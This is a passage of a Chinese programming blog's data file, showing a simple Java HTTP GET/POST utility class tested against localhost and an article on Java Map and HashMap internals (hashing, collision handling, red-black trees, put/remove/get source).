class=\"line\"></span><br><span class=\"line\">            headers = connection.getHeaderFields();</span><br><span class=\"line\">            br = new BufferedReader(new InputStreamReader(connection.getInputStream()));</span><br><span class=\"line\">            String line;</span><br><span class=\"line\">            while ((line = br.readLine()) != null)&#123;</span><br><span class=\"line\">                sb.append(line);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            res.put(&quot;headers&quot;,headers);</span><br><span class=\"line\">            res.put(&quot;response&quot;,sb.toString());</span><br><span class=\"line\">        &#125;catch (Exception e1)&#123;</span><br><span class=\"line\">            e1.printStackTrace();</span><br><span class=\"line\">        &#125;finally &#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                if(connection != null)&#123;</span><br><span class=\"line\">                    connection.disconnect();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                if(br != null)&#123;</span><br><span class=\"line\">                    br.close();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                if(out != null)&#123;</span><br><span class=\"line\">                    out.close();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;catch (Exception e2)&#123;</span><br><span class=\"line\">                e2.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private void xxxx()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String args[])&#123;</span><br><span class=\"line\">//        Map&lt;String,Object&gt; res = get(&quot;http://127.0.0.1:8080/test1&quot;,&quot;&quot;);</span><br><span class=\"line\">//        System.out.println(res.get(&quot;response&quot;));</span><br><span class=\"line\">//        System.out.println(res.get(&quot;headers&quot;));</span><br><span class=\"line\">//        Map&lt;String,List&lt;String&gt;&gt; headers  = (Map&lt;String, List&lt;String&gt;&gt;)res.get(&quot;headers&quot;);</span><br><span class=\"line\">//        System.out.println(headers.get(&quot;Content-Type&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">        String params = &quot;&#123;\\n&quot; +</span><br><span class=\"line\">                &quot;    \\&quot;status\\&quot;: 0,\\n&quot; +</span><br><span class=\"line\">                &quot;    \\&quot;data\\&quot;: \\&quot;hello world!\\&quot;\\n&quot; +</span><br><span class=\"line\">                &quot;&#125;&quot;;</span><br><span class=\"line\">        Map&lt;String,Object&gt; res = post(&quot;http://127.0.0.1:8080/test2&quot;,params);</span><br><span class=\"line\">        System.out.println(res.get(&quot;response&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package util;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.omg.CORBA.portable.OutputStream;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.*;</span><br><span class=\"line\">import java.net.HttpURLConnection;</span><br><span class=\"line\">import java.net.URL;</span><br><span class=\"line\">import java.util.HashMap;</span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\">import java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * 发送与接收都是String  接收到String类型的返回后自己用fastJson转一下</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class HttpClientUtil &#123;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * url为地址，params 为请求参数 如 id=1&amp;name=xx</span><br><span class=\"line\">     * @param url</span><br><span class=\"line\">     * @param params</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    private static  Map get(String url, String params)&#123;</span><br><span class=\"line\">        HttpURLConnection connection = null;</span><br><span class=\"line\">        BufferedReader br = null;</span><br><span class=\"line\">        Map&lt;String,Object&gt; res = new HashMap&lt;&gt;();</span><br><span class=\"line\">        StringBuffer sb = new StringBuffer();</span><br><span class=\"line\">        Map&lt;String,List&lt;String&gt;&gt; headers;</span><br><span class=\"line\"></span><br><span class=\"line\">        try&#123;</span><br><span class=\"line\">            URL send_url = params.equals(&quot;&quot;) ? new URL(url) : new URL(url + &quot;?&quot; + params);</span><br><span class=\"line\">            connection = (HttpURLConnection) send_url.openConnection();</span><br><span class=\"line\">            connection.setRequestMethod(&quot;GET&quot;);</span><br><span class=\"line\">            //一些设置</span><br><span class=\"line\">            connection.setRequestProperty(&quot;Connection&quot;,&quot;keep-alive&quot;);</span><br><span class=\"line\">            connection.setRequestProperty(&quot;Accept-Charset&quot;,&quot;utf8, gbk; q=0.6&quot;);</span><br><span class=\"line\">            //content-type浏览器会自动解析</span><br><span class=\"line\">            //connection.setRequestProperty(&quot;Content-Type&quot;,&quot;application/json&quot;);</span><br><span class=\"line\">            //connection.setDoOutput(true);</span><br><span class=\"line\">            connection.setUseCaches(false);</span><br><span class=\"line\"></span><br><span class=\"line\">            connection.connect();</span><br><span class=\"line\">            headers = connection.getHeaderFields();</span><br><span class=\"line\"></span><br><span class=\"line\">            br = new BufferedReader(new InputStreamReader(connection.getInputStream(),&quot;UTF-8&quot;));</span><br><span class=\"line\">            String line = &quot;&quot;;</span><br><span class=\"line\">            while ((line = br.readLine()) != null)&#123;</span><br><span class=\"line\">                sb.append(line);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            res.put(&quot;headers&quot;,headers);</span><br><span class=\"line\">            res.put(&quot;response&quot;, sb);</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            System.out.println(&quot;http_get 异常！&quot;);</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;finally &#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                if(connection != null)&#123;</span><br><span class=\"line\">                    connection.disconnect();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                if(br != null)&#123;</span><br><span class=\"line\">                    br.close();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;catch (Exception e2)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * params为postc参数</span><br><span class=\"line\">     * @param url</span><br><span class=\"line\">     * @param params</span><br><span class=\"line\">     */</span><br><span class=\"line\">    private static  Map post(String url, String params)&#123;</span><br><span class=\"line\">        HttpURLConnection connection = null;</span><br><span class=\"line\">        BufferedReader br = null;</span><br><span class=\"line\">        OutputStreamWriter out = null;</span><br><span class=\"line\">        Map&lt;String,Object&gt; res = new HashMap&lt;&gt;();</span><br><span class=\"line\">        StringBuffer sb = new StringBuffer();</span><br><span class=\"line\">        Map&lt;String,List&lt;String&gt;&gt; headers;</span><br><span class=\"line\"></span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            URL send_url = new URL(url);</span><br><span class=\"line\">            connection = (HttpURLConnection)send_url.openConnection();</span><br><span class=\"line\"></span><br><span class=\"line\">            connection.setRequestMethod(&quot;POST&quot;);</span><br><span class=\"line\">            connection.setRequestProperty(&quot;Content-Type&quot;, &quot;application/json&quot;);</span><br><span class=\"line\">            connection.setRequestProperty(&quot;Connection&quot;, &quot;Keep-Alive&quot;);</span><br><span class=\"line\">            connection.setUseCaches(false);</span><br><span class=\"line\">            //以后就可以使用conn.getOutputStream().write()</span><br><span class=\"line\">            connection.setDoOutput(true);</span><br><span class=\"line\">            //以后就可以使用conn.getInputStream().read();</span><br><span class=\"line\">            connection.setDoInput(true);</span><br><span class=\"line\"></span><br><span class=\"line\">            out = new OutputStreamWriter(connection.getOutputStream(),&quot;UTF-8&quot;);</span><br><span class=\"line\">            out.write(params);</span><br><span class=\"line\">            out.flush();</span><br><span class=\"line\"></span><br><span class=\"line\">            headers = connection.getHeaderFields();</span><br><span class=\"line\">            br = new BufferedReader(new InputStreamReader(connection.getInputStream()));</span><br><span class=\"line\">            String line;</span><br><span class=\"line\">            while ((line = br.readLine()) != null)&#123;</span><br><span class=\"line\">                sb.append(line);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            res.put(&quot;headers&quot;,headers);</span><br><span class=\"line\">            res.put(&quot;response&quot;,sb.toString());</span><br><span class=\"line\">        &#125;catch (Exception e1)&#123;</span><br><span class=\"line\">            e1.printStackTrace();</span><br><span class=\"line\">        &#125;finally &#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                if(connection != null)&#123;</span><br><span class=\"line\">                    connection.disconnect();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                if(br != null)&#123;</span><br><span class=\"line\">                    br.close();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                if(out != null)&#123;</span><br><span class=\"line\">                    out.close();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;catch (Exception e2)&#123;</span><br><span class=\"line\">                e2.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private void xxxx()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String args[])&#123;</span><br><span class=\"line\">//        Map&lt;String,Object&gt; res = get(&quot;http://127.0.0.1:8080/test1&quot;,&quot;&quot;);</span><br><span class=\"line\">//        System.out.println(res.get(&quot;response&quot;));</span><br><span class=\"line\">//        System.out.println(res.get(&quot;headers&quot;));</span><br><span class=\"line\">//        Map&lt;String,List&lt;String&gt;&gt; headers  = (Map&lt;String, List&lt;String&gt;&gt;)res.get(&quot;headers&quot;);</span><br><span class=\"line\">//        System.out.println(headers.get(&quot;Content-Type&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">        String params = &quot;&#123;\\n&quot; +</span><br><span class=\"line\">                &quot;    \\&quot;status\\&quot;: 0,\\n&quot; +</span><br><span class=\"line\">                &quot;    \\&quot;data\\&quot;: \\&quot;hello world!\\&quot;\\n&quot; +</span><br><span class=\"line\">                &quot;&#125;&quot;;</span><br><span class=\"line\">        Map&lt;String,Object&gt; res = post(&quot;http://127.0.0.1:8080/test2&quot;,params);</span><br><span class=\"line\">        System.out.println(res.get(&quot;response&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"java基础-Map","date":"2019-07-08T20:50:34.000Z","_content":"\n### 一.Map和Collection\n\nJava 集合类总共两大接口: Map 和 Collection<br>\n\n其中: Map 中元素是成对出现的(key, value), Collection 中元素是单独出现的.  如:<br>\n```\nMap<String,String> //true ,成对\n\nList<String> //true, 单独\nList<Map<String,String>>// true, 单独， 一个Map对象\n\nList<String, String> //false\n```\n\n### 二.主要实现类\n\n- HashMap\n- ConcurrentHashMapp\n- HashTable\n- TreeMap\n- LinkendHashMap\n\n### 三.具体实现\n\n#### 1.HashMap\n在JDK1.8中 HashMap由位桶+链表+红黑树实现.<br>\n\n##### 1.1 散列表\n\n###### 1.1.1 概念\n原文：https://www.cnblogs.com/absfree/p/5508570.html<br>\n\n符号表是一种用于存储键值对（key-value pair）的数据结构，我们平常经常使用的数组也可以看做是一个特殊的符号表，数组中的“键”即为数组索引，值为相应的数组元素。也就是说，当符号表中所有的键都是较小的整数时，我们可以使用数组来实现符号表，将数组的索引作为键，而索引处的数组元素即为键对应的值，但是这一表示仅限于所有的键都是比较小的整数时，否则可能会使用一个非常大的数组。<strong>散列表是对以上策略的一种“升级”，但是它可以支持任意的键而并没有对它们做过多的限定。</strong> <br>\n对于基于散列表实现的符号表，若我们要在其中查找一个键，需要进行以下步骤：<br>\n\n- 首先我们使用散列函数将给定键转化为一个“数组的索引”，理想情况下，不同的key会被转为不同的索引，但在实际应用中我们会遇到不同的键转为相同的索引的情况，这种情况叫做碰撞。\n\n- 得到了索引后，我们就可以像访问数组一样，通过这个索引访问到相应的键值对。\n\n\n以上就是散列表的核心思想，散列表是 <strong>时空权衡</strong> 的经典例子。当我们的空间无限大时，我们可以直接使用一个很大的数组来保存键值对，并用key作为数组索引，因为空间不受限，所以我们的键的取值可以无穷大，因此查找任何键都只需进行一次普通的数组访问。反过来，若对查找操作没有任何时间限制，我们就可以直接使用链表来保存所有键值对，这样把空间的使用降到了最低，但查找时只能顺序查找。在实际的应用中，我们的时间和空间都是有限的，所以我们必须在两者之间做出权衡，散列表就在时间和空间的使用上找到了一个很好的平衡点。散列表的一个优势在于我们只需调整散列算法的相应参数而无需对其他部分的代码做任何修改就能够在时间和空间的权衡上做出策略调整。<br>\n\n###### 1.1.2 散列函数\n\n在散列表内部，我们使用 <strong>桶（bucket）</strong>来保存键值对，我们前面所说的数组索引即为桶号，决定了给定的键存于散列表的哪个桶中。散列表所拥有的桶数被称为散列表的<strong> 容量（capacity）</strong><br>\n\n现在假设我们的散列表中有M个桶，桶号为0到M-1。我们的散列函数的功能就是把任意给定的key转为[0, M-1]上的整数。我们对散列函数有两个基本要求：一是计算时间要短，二是尽可能把键分布在不同的桶中。对于不同类型的键，我们需要使用不同的散列函数，这样才能保证有比较好的散列效果。<br>\n\n我们使用的散列函数应该尽可能满足均匀散列假设,使用的散列函数能够均匀并独立地将所有的键散布于0到M – 1之间。这样一来，满足均匀性与独立性能够保证键值对在散列表的分布尽可能的均匀，不会出现“许多键值对被散列到同一个桶，而同时许多桶为空”的情况。<br>\n\nJava中的常用类，基本都重写了 <Strong>hashCode()</strong> 方法，用于获取其散列值.<br>\n\n###### 1.1.3 获取桶号\n\n前面我们介绍了计算对象hashCode的一些方法，那么我们获取了hashCode之后，如何进一步得到桶号呢？一个直接的办法就是直接拿得到的hashCode除以capacity（桶的数量），然后用所得的余数作为桶号。不过在Java中，hashCode是int型的，而Java中的int型均为有符号，所以我们要是直接使用返回的hashCode的话可能会得到一个负数，显然桶号是不能为负的。所以我们先将返回的hashCode转变为一个非负整数，再用它除以capacity取余数，作为key的对应桶号，具体代码如下：<br>\n```\nprivate int hash(K key) {\n    return (key.hashCode() & 0x7fffffff) % M;\n}\n```\n\n###### 1.1.4 处理碰撞\n\n- 拉链法\n\n以这种方式实现的散列表，每个桶里都存放了一个链表。初始时所有链表均为空，当一个键被散列到一个桶时，这个键就成为相应桶中链表的首结点，之后若再有一个键被散列到这个桶（即发生碰撞），第二个键就会成为链表的第二个结点，以此类推。这样一来，当桶数为M，散列表中存储的键值对数目为N时，平均每个桶中的链表包含的结点数为N / M。因此，当我们查找一个键时，首先通过散列函数确定它所在的桶，这一步所需时间为O(1)；然后我们依次比较桶中结点的键与给定键，若相等则找到了指定键值对，这一步所需时间为O(N / M)。所以查找操作所需的时间为O(N / M)，而通常我们都能够保证N是M的常数倍，所以散列表的查找操作的时间复杂度为O(1)，同理我们也可以得到插入操作的复杂度也为O(1)。<br>\n\n在上面的实现中，我们固定了散列表的桶数，当我们明确知道我们要插入的键值对数目最多只能到达桶数的常数倍时，固定桶数是完全可行的。但是若键值对数目会增长到远远大于桶数，我们就需要动态调整桶数的能力。实际上，散列表中的键值对数与桶数的比值叫做负载因子（load factor）。通常负载因子越小，我们进行查找所需时间就越短，而空间的使用就越大；若负载因子较大，则查找时间会变长，但是空间使用会减小。比如，Java标准库中的HashMap就是基于拉链法实现的散列表，它的默认负载因子为0.75。HashMap实现动态调整桶数的方式是基于公式loadFactor = maxSize / capacity，其中maxSize为支持存储的最大键值对数，而loadFactor和capacity（桶数）都会在初始化时由用户指定或是由系统赋予默认值。当HashMap中的键值对的数目达到了maxSize时，就会增大散列表中的桶数。<br>\n\n- 线性探测法\n\n线性探测法是另一种散列表的实现策略的具体方法，这种策略叫做开放定址法。开放定址法的主要思想是：用大小为M的数组保存N个键值对，其中M > N，数组中的空位用于解决碰撞问题。线性探测法的主要思想是：当发生碰撞时（一个键被散列到一个已经有键值对的数组位置），我们会检查数组的下一个位置，这个过程被称作线性探测。<br>\n\n线性探测可能会产生三种结果:<br>\n命中：该位置的键与要查找的键相同；<br>\n未命中：该位置为空；<br>\n该位置的键和被查找的键不同。<br>\n\n当我们查找某个键时，首先通过散列函数得到一个数组索引后，之后我们就开始检查相应位置的键是否与给定键相同，若不同则继续查找（若到数组末尾也没找到就折回数组开头），直到找到该键或遇到一个空位置。由线性探测的过程我们可以知道，若数组已满的时候我们再向其中插入新键，会陷入无限循环之中。<br>\n\n有必要实现动态增长数组来保持查找操作的常数时间复杂度。当键值对总数很小时，若空间比较紧张，可以动态缩小数组，这取决于实际情况。<br>\n\n##### 1.2 红黑树\n\n###### 1.2.1 二叉查找树\n\n二叉查找树（Binary Search Tree），也称有序二叉树（ordered binary tree）,排序二叉树（sorted binary tree），是指一棵空树或者具有下列性质的二叉树：<br>\n\n- 若任意结点的左子树不空，则左子树上所有结点的值均小于它的根结点的值；\n- 若任意结点的右子树不空，则右子树上所有结点的值均大于它的根结点的值；\n- 任意结点的左、右子树也分别为二叉查找树。\n- 没有键值相等的结点（no duplicate nodes）。\n\n二叉查找树一般查找时间为O(lgn),当极端情况出现时，二叉树退化为一颗具有n个节点的线性链后，复杂度退化为线性O(n).\n\n###### 1.2.2 红黑树\n\n红黑树本质上是一颗二叉查找树,红黑树增加了一些性质，保证在最坏的情况下，复杂的也是O(logn).<br>\n\n- 每个结点要么是红的，要么是黑的。  \n- 根结点是黑的。  \n- 每个叶结点（叶结点即指树尾端NIL指针或NULL结点）是黑的。  \n- 如果一个结点是红的，那么它的俩个儿子都是黑的。  \n- 对于任一结点而言，其到叶结点树尾端NIL指针的每一条路径都包含相同数目的黑结点。  \n\n图片来源(https://github.com/julycoding/The-Art-Of-Programming-By-July/blob/master/ebook/zh/03.01.md)<br>\n![shu](http://67.216.218.49:8000/file/blogs/java/collection/hongheishu.png)\n\n###### 1.2.3 红黑树的操作\n\n当我们在对红黑树进行插入和删除等操作时，对树做了修改，那么可能会违背红黑树的性质。为了继续保持红黑树的性质，我们可以通过对结点进行重新着色，以及对树进行相关的旋转操作，即修改树中某些结点的颜色及指针结构，来达到对红黑树进行插入或删除结点等操作后，继续保持它的性质或平衡。<br>\n不在这里详述，单独写一篇文章<br>\n\n##### 1.3 HashMap\n\n###### 1.3.1 属性\n\n```\n//初始容量  10000(2进制)\nstatic final int DEFAULT_INITIAL_CAPACITY = 1 << 4; // aka 16\n\n//最大容量\nstatic final int MAXIMUM_CAPACITY = 1 << 30;\n\n//默认负载因子\nstatic final float DEFAULT_LOAD_FACTOR = 0.75f;\n\n//当节点中的元素个数大于该值时，桶中链表转换为树\nstatic final int TREEIFY_THRESHOLD = 8;\n\n//同上，不过是将树转化为链表表\nstatic final int UNTREEIFY_THRESHOLD = 6;\n\n//桶可能被转为树形结构时的最小容量\nstatic final int MIN_TREEIFY_CAPACITY = 64;\n\n```\n\n###### 1.3.2 构造方法\n\n```\npublic HashMap(int initialCapacity, float loadFactor) {\n   if (initialCapacity < 0)\n       throw new IllegalArgumentException(\"Illegal initial capacity: \" +\n                                          initialCapacity);\n   if (initialCapacity > MAXIMUM_CAPACITY)\n       initialCapacity = MAXIMUM_CAPACITY;\n   if (loadFactor <= 0 || Float.isNaN(loadFactor))\n       throw new IllegalArgumentException(\"Illegal load factor: \" +\n                                          loadFactor);\n   this.loadFactor = loadFactor;\n   this.threshold = tableSizeFor(initialCapacity);\n}\n\n\npublic HashMap(int initialCapacity) {\n   this(initialCapacity, DEFAULT_LOAD_FACTOR);\n}\n\n\npublic HashMap() {\n   this.loadFactor = DEFAULT_LOAD_FACTOR; // all other fields defaulted\n}\n\npublic HashMap(Map<? extends K, ? extends V> m) {\n   this.loadFactor = DEFAULT_LOAD_FACTOR;\n   putMapEntries(m, false);\n}\n\n```\n\n其中，初始化threshold时:\n\n```\nstatic final int tableSizeFor(int cap) {\n    int n = cap - 1;\n    n |= n >>> 1;\n    n |= n >>> 2;\n    n |= n >>> 4;\n    n |= n >>> 8;\n    n |= n >>> 16;\n    return (n < 0) ? 1 : (n >= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;\n}\n```\n\n此算法原理为: <br>\n原文:https://www.cnblogs.com/loading4/p/6239441.html<br>\n通过位运算，找到大于入参的最近一个2的整数次幂<br>\n\n- 先来假设n的二进制为01xxx...xxx。接着\n\n- 对n右移1位：001xx...xxx，再位或：011xx...xxx\n\n- 对n右移2为：00011...xxx，再位或：01111...xxx\n\n- 此时前面已经有四个1了，再右移4位且位或可得8个1\n\n- 同理，有8个1，右移8位肯定会让后八位也为1。\n- 综上可得，该算法让最高位的1后面的位全变为1。\n- 最后再让结果n+1，即得到了2的整数次幂的值了\n\n<strong>threshold这个成员变量是阈值，决定了是否要将散列表再散列。它的值应该是：capacity * load_factor才对的。里仅仅是一个初始化，当创建哈希表的时候，它会重新赋值<br></strong>\n\n###### 1.3.3 增 put()\n\nHashMap的内部链表结构:<br>\n```\nstatic class Node<K,V> implements Map.Entry<K,V> {\n    final int hash;\n    final K key;\n    V value;\n    Node<K,V> next;\n\n    Node(int hash, K key, V value, Node<K,V> next) {\n        this.hash = hash;\n        this.key = key;\n        this.value = value;\n        this.next = next;\n    }\n  .....\n}\n```\n添加元素的put()方法:<br>\n```\npublic V put(K key, V value) {\n    return putVal(hash(key), key, value, false, true);\n}\n\n\nfinal V putVal(int hash, K key, V value, boolean onlyIfAbsent,\n                  boolean evict) {\n  //链表结构存储\n   Node<K,V>[] tab; Node<K,V> p; int n, i;\n   //散列表为null时  初始化\n   if ((tab = table) == null || (n = tab.length) == 0)\n       n = (tab = resize()).length;\n  //没有发生碰撞，直接存储\n   if ((p = tab[i = (n - 1) & hash]) == null)\n       tab[i] = newNode(hash, key, value, null);\n  //发生碰撞\n   else {\n       Node<K,V> e; K k;\n      //hash和key都相等，记录下来，下一步处理\n       if (p.hash == hash &&\n           ((k = p.key) == key || (key != null && key.equals(k))))\n           e = p;\n      //树形结构，调用树的方法\n       else if (p instanceof TreeNode)\n           e = ((TreeNode<K,V>)p).putTreeVal(this, tab, hash, key, value);\n      //链表结构\n       else {\n           for (int binCount = 0; ; ++binCount) {\n               //没有找到映射的节点，在链表尾部插入\n               if ((e = p.next) == null) {\n                   p.next = newNode(hash, key, value, null);\n                   //节点数大于等于TREEIFY_THRESHOLD 转为树形存储\n                   if (binCount >= TREEIFY_THRESHOLD - 1) // -1 for 1st\n                       treeifyBin(tab, hash);\n                   break;\n               }\n               //找到hash值映射的节点，插入\n               if (e.hash == hash &&\n                   ((k = e.key) == key || (key != null && key.equals(k))))\n                   break;\n               p = e;\n           }\n       }\n       //上一步的e,因为hash和key都存在，用新值覆盖旧值，返回旧值\n       if (e != null) { // existing mapping for key\n           V oldValue = e.value;\n           if (!onlyIfAbsent || oldValue == null)\n               e.value = value;\n           afterNodeAccess(e);\n           return oldValue;\n       }\n   }\n   ++modCount;\n   //检查阈值，是否再次散列\n   if (++size > threshold)\n       resize();\n   afterNodeInsertion(evict);\n   return null;\n}\n\n```\n\n###### 1.3.4 删 remove()\n\n```\npublic V remove(Object key) {\n    Node<K,V> e;\n    return (e = removeNode(hash(key), key, null, false, true)) == null ?\n        null : e.value;\n}\n\nfinal Node<K,V> removeNode(int hash, Object key, Object value,\n                           boolean matchValue, boolean movable) {\n    Node<K,V>[] tab; Node<K,V> p; int n, index;\n    //hash值指向的桶是否存在\n    if ((tab = table) != null && (n = tab.length) > 0 &&\n        (p = tab[index = (n - 1) & hash]) != null) {\n        Node<K,V> node = null, e; K k; V v;\n        //在首位进行查找，记录下找到的节点\n        if (p.hash == hash &&\n            ((k = p.key) == key || (key != null && key.equals(k))))\n            node = p;\n        //没找到，继续找\n        else if ((e = p.next) != null) {\n           //树里面找\n            if (p instanceof TreeNode)\n                node = ((TreeNode<K,V>)p).getTreeNode(hash, key);\n            else {\n              //链表里面找\n                do {\n                    if (e.hash == hash &&\n                        ((k = e.key) == key ||\n                         (key != null && key.equals(k)))) {\n                        node = e;\n                        break;\n                    }\n                    p = e;\n                } while ((e = e.next) != null);\n            }\n        }\n        //将找到的node删除\n        if (node != null && (!matchValue || (v = node.value) == value ||\n                             (value != null && value.equals(v)))) {\n            if (node instanceof TreeNode)\n                ((TreeNode<K,V>)node).removeTreeNode(this, tab, movable);\n            else if (node == p)\n                tab[index] = node.next;\n            else\n                p.next = node.next;\n            ++modCount;\n            --size;\n            afterNodeRemoval(node);\n            return node;\n        }\n    }\n    return null;\n}\n```\n\n###### 1.3.5 查 get()\n\n```\npublic V get(Object key) {\n   Node<K,V> e;\n   return (e = getNode(hash(key), key)) == null ? null : e.value;\n}\n\nfinal Node<K,V> getNode(int hash, Object key) {\n    Node<K,V>[] tab; Node<K,V> first, e; int n; K k;\n    if ((tab = table) != null && (n = tab.length) > 0 &&\n        (first = tab[(n - 1) & hash]) != null) {\n        if (first.hash == hash && // always check first node\n            ((k = first.key) == key || (key != null && key.equals(k))))\n            return first;\n        if ((e = first.next) != null) {\n            if (first instanceof TreeNode)\n                return ((TreeNode<K,V>)first).getTreeNode(hash, key);\n            do {\n                if (e.hash == hash &&\n                    ((k = e.key) == key || (key != null && key.equals(k))))\n                    return e;\n            } while ((e = e.next) != null);\n        }\n    }\n    return null;\n}\n\n```\n\n###### 1.3.6 resize()\n\nresize()对散列表进行扩容。<br>\n```\nfinal Node<K,V>[] resize() {\n   Node<K,V>[] oldTab = table;\n   //容量\n   int 